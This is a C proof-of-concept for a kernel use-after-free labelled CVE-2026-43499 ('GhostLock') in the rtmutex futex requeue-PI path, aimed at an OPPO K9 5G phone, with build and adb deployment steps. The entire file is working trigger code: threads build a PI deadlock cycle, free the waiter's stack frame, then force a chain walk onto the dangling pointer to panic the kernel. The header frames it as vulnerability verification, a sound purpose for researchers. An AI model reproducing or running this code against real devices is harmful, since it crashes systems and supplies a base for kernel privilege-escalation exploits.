/*
 * ============================================================
 *  CVE-2026-43499 (GhostLock) Trigger PoC
 *  Target: OPPO K9 5G (PEXM00) - Kernel 4.19.157-perf+
 * ============================================================
 *
 *  Bug: remove_waiter() in rtmutex.c incorrectly uses current
 *       instead of waiter->task during proxy-lock rollback from
 *       futex_requeue(). Leaves dangling pi_blocked_on pointer
 *       → use-after-free on kernel stack.
 *
 *  Usage:
 *    - Compile with Android NDK (aarch64-linux-android-clang)
 *    - adb push to /data/local/tmp/
 *    - chmod +x and run
 *    - Expected: kernel panic (UAF write to freed stack page)
 *
 *  This PoC is for vulnerability verification only.
 *  Used to test mitigation effectiveness before official patch.
 * ============================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

#ifndef SYS_gettid
#define SYS_gettid 178
#endif

#ifndef FUTEX_WAIT
#define FUTEX_WAIT              0
#define FUTEX_WAKE              1
#define FUTEX_LOCK_PI           6
#define FUTEX_UNLOCK_PI         7
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12
#define FUTEX_PRIVATE_FLAG      128
#endif

#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)

/* ============================================================
 *  Global state
 * ============================================================ */
static uint32_t futex1      = 0;
static uint32_t futex2      = 0;
static uint32_t cycle_futex = 0;

static volatile int o_ready    = 0;
static volatile int w_ready    = 0;
static volatile int o_blocking = 0;
static volatile int w_waiting  = 0;
static volatile int uaf_probe  = 0;

/* ============================================================
 *  Helper: futex syscall wrapper
 * ============================================================ */
static long xfutex(uint32_t *u, int op, uint32_t val,
                   void *ts, uint32_t *u2, uint32_t v3)
{
    return syscall(SYS_futex, u, op, val, ts, u2, v3);
}

static void dbg(const char *s) { write(2, s, strlen(s)); }

static void dbg_long(const char *prefix, long v, int en)
{
    char buf[128];
    int n = snprintf(buf, sizeof(buf), "%s%ld  errno=%d (%s)\n",
                     prefix, v, en, strerror(en));
    write(2, buf, n);
}

/* ============================================================
 *  Owner thread (O)
 *  - Owns futex2
 *  - Blocks on cycle_futex (owned by W)
 *  - Creates O->pi_blocked_on link for deadlock cycle
 * ============================================================ */
static void *owner_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);

    __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&o_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&w_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&o_blocking, 1, __ATOMIC_RELEASE);
    /* blocks: kernel sets O->pi_blocked_on on cycle_futex_pi_mutex */
    xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

/* ============================================================
 *  Waiter thread (W)
 *  - Owns cycle_futex
 *  - Waits on futex1 via FUTEX_WAIT_REQUEUE_PI → futex2
 *  - After EDEADLK: W->pi_blocked_on left dangling
 *  - On timeout: stack frame frees → UAF window opens
 * ============================================================ */
static void *waiter_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);
    struct timespec ts;
    long r;

    while (!__atomic_load_n(&o_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&w_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&o_blocking, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(20000); /* let O enter kernel and establish pi_blocked_on */

    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);

    /*
     * Absolute monotonic deadline 3 seconds from now.
     * EDEADLK fires within ~60ms, well before deadline.
     * On timeout: syscall exits cleanly, W_rt_waiter is freed,
     * leaving W->pi_blocked_on as a dangling pointer.
     */
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 3;

    r = xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
    dbg_long("[W] FUTEX_WAIT_REQUEUE_PI returned ", r, errno);

    /* Thrash kernel stack to overwrite the freed waiter slot */
    for (volatile int i = 0; i < 300; i++)
        syscall(SYS_getpid);

    /* Signal main thread: UAF window is open */
    __atomic_store_n(&uaf_probe, 1, __ATOMIC_RELEASE);

    /*
     * Stay alive as cycle_futex owner long enough for M to trigger
     * the PI chain walk UAF while W->pi_blocked_on is still stale.
     */
    usleep(800000);

    /* Cleanup */
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

/* ============================================================
 *  Main thread (M)
 *  - Fires FUTEX_CMP_REQUEUE_PI to trigger EDEADLK
 *  - After W timeout: probes UAF via FUTEX_LOCK_PI
 * ============================================================ */
int main(void)
{
    pthread_t oth, wth;

    dbg("============================================\n");
    dbg(" CVE-2026-43499 GhostLock Trigger PoC\n");
    dbg(" Target: OPPO K9 (4.19.157-perf+)\n");
    dbg("============================================\n\n");

    pthread_create(&oth, NULL, owner_fn, NULL);
    pthread_create(&wth, NULL, waiter_fn, NULL);

    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(50000); /* let W land in kernel wait queue */

    dbg("[M] Deadlock chain: W->futex2(O)->cycle_futex(W)->W\n");
    dbg("[M] Firing FUTEX_CMP_REQUEUE_PI...\n");

    long ret = xfutex(&futex1, FCRQ,
                      1,                    /* nr_wake = 1 (required for requeue_pi) */
                      (void *)(uintptr_t)1, /* nr_requeue = 1                     */
                      &futex2,              /* PI target futex                    */
                      0);                   /* cmpval for futex1                  */
    int err = errno;
    dbg_long("[M] FUTEX_CMP_REQUEUE_PI = ", ret, err);

    if (ret == -1 && err == EDEADLK) {
        dbg("[M] EDEADLK confirmed! W->pi_blocked_on is stale.\n");
        dbg("[M] Waiting for W timeout to open UAF window...\n");

        while (!__atomic_load_n(&uaf_probe, __ATOMIC_ACQUIRE))
            sched_yield();

        /*
         * UAF probe: FUTEX_LOCK_PI(cycle_futex) forces PI chain walk.
         * rt_mutex_adjust_prio_chain() follows W->pi_blocked_on →
         * stale pointer into freed kernel stack → UAF write → panic.
         */
        dbg("[M] UAF probe: FUTEX_LOCK_PI(cycle_futex)\n");
        dbg("[M] If vulnerable: kernel panic expected shortly...\n");
        xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
        dbg("[M] UAF probe returned (no panic? maybe patched)\n");
        xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    } else {
        dbg("[M] ERROR: EDEADLK not triggered. Check kernel config.\n");
        dbg("[M] Make sure CONFIG_RT_MUTEXES and CONFIG_FUTEX_PI are enabled.\n");
    }

    pthread_join(wth, NULL);
    pthread_join(oth, NULL);
    return 0;
}
